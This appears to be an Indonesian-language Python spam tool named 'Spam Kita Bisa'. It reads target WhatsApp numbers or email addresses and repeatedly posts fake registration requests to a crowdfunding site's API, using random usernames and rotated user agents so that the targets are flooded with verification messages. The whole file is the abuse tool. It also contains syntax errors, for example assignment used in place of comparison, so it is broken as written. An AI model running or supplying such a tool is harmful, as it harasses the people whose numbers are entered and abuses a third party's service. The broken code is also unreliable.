#-*- coding: utf8 -*-
#ya maap kodingam we berantakan :)>

import requests,random,time,os,sys
req=requests.Session()

r='\033[91m'
c='\033[96m'
w='\033[0m'

__banner__ = (''' 
  _   _ _        ___ _          
 | |_(_) |_ __ _| _ |_)___ __ _ 
 | / / |  _/ _` | _ \ (_-</ _` |
 |_\_\_|\__\__,_|___/_/__/\__,_|
                                
╭───────────────────────────────╮
  Tools : Spam Kita Bisa
  Author : Tampansky
  Team : 7 Ghost Team\tv2.0
╰───────────────────────────────╯
    ''' % (c,w,c,w,c,w,c,w,c,w))


class Mate_lampu():
        def __init__(self):
            self.ua=open('sky.txt').read().splitlines()
            os.system('clear')
            print(__banner__)
            self.sok_aelu()

        def sok_aelu(self):
            type = str(input('[?] Type: '))
            if type = 'wa':
                self.tolol = 'phone_number'
                self.goblok=str(input('[-] no wa (pisahkan dgn koma): '))
            elif type = 'email':
                self.tolol = 'email'
                self.goblok=str(input('[-] email (pisahkan dgn koma): '))
            else:
                Mate_lampu()
            self.goblok = self.goblok.split(",")
            self.saapa=int(input('[?] jumlah: '))
            print('[!] delay 4 menit :V')
            for angka in range(1,self.saapa+1):
            	for x in self.goblok:
            		self.spam_kuy(x,angka)
            	time.sleep(240)
            quit('%s[%s#%s]%s selsai ...' % (r,c,r,w))
            
        def uname(self):
        	uname = ''
        	for x in range(12):
        		uname += random.choice('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890')
        	return uname

        def spam_kuy(self,nomorna,angka):
            #for i in range(1,self.saapa+1):
                ceko = req.post('https://core.ktbs.io/v2/user/registration/temp',headers={'user-agent':random.choice(self.ua)}, json={'full_name':self.uname(),'user_id':nomorna,'user_id_type':self.tolol})
                if ceko.status_code == 200:
                    print('  %s[%d] Pesan: %ssuskes spam ke: %s gan hehe :"c ' % (w,angka,c,nomorna))
                else:
                    print('  %s[%d] Pesan: %s%s' % (w,angka,r,ceko.json()['errors'][0]['details']['id']))




  
# -----main -------

try:
	sys.exit(Mate_lampu())
except Exception as _er:
    quit('%serror: %s' % (r,_er))